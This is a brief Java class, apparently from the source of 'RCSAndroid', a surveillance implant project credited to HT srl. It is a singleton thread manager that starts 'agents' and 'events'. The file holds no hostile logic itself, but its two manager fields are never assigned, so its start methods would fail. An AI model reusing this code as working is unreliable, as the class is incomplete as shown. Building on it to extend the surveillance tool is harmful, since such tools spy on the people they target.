/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI;

public class ThreadManager {
	private volatile static ThreadManager singleton;

	private AgentManager aManager;
	private EventManager eManager;
	
	public static ThreadManager self() {
		if (singleton == null) {
			synchronized(ThreadManager.class) {
				if (singleton == null) {
                    singleton = new ThreadManager();
                }
			}
		}

		return singleton;
	}
	
	private ThreadManager() {
		
	}
	
	public void startAgents() {
		aManager.startAgents();
	}
	
	public void startEvents() {
		eManager.startEvents();
	}
}
